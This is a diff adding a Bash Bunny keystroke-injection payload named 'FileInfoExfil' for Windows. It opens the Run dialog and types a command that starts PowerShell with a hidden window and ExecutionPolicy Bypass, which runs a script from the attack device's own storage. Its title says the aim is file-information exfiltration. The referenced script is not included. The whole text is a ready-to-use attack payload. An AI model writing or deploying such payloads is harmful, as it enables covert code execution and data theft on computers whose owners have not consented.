@@ -1,0 +1,16 @@
+REM Title: FileInfoExfil
+REM Creator: A_SarcasticGuy 
+REM Target: Windows
+REM Version: 1.0
+
+DELAY 500
+
+GUI r
+
+
+DELAY 1000
+
+
+STRING powershell -windowstyle hidden -ExecutionPolicy ByPass ".((gwmi win32_volume -f 'label=''BASHBUNNY''').Name+'payloads\p.ps1')"
+
+ENTER
